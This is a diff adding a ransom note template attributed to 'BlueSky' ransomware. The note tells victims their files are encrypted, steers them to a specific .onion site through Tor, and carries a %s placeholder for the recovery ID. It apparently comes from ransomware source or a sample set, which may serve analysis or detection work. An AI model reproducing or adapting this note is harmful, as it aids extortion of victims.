@@ -1,0 +1,14 @@
+<<< B L U E S K Y >>>
+YOUR IMPORTANT FILES, DOCUMENTS, PHOTOS, VIDEOS, DATABASES HAVE BEEN ENCRYPTED!
+The only way to decrypt and restore your files is with our private key and program.
+Any attempts to restore your files manually will damage your files.
+To restore your files follow these instructions:
+--------------------------------------------------------------
+1. Download and install "Tor Browser" from https://torproject.org/
+2. Run "Tor Browser"
+3. In the tor browser open website:
+   http://ccpyeuptrlatb2piua4ukhnhi7lrxgerrcrj4p2b5uhbzqm2xgdjaqid.onion
+4. On the website enter your recovery id:
+RECOVERY ID: %s
+5. Follow the instructions
+--------------------------------------------------------------
